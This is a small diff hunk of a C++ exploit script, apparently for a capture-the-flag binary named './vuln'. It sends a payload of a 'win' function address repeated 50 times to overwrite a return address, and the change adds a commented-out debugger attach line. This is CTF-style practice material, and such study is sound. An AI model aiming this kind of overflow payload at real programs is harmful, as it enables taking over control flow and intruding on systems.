@@ -28,6 +28,7 @@ int main(int argc, char *argv[])
     auto payload = p32(win) * 50;
 
     auto io = Process("./vuln");
+    // gdb::attach(io); // Must be used with tmux
     io.sendline(payload);
     std::cout << io.recvall() << std::endl;
     return 0;
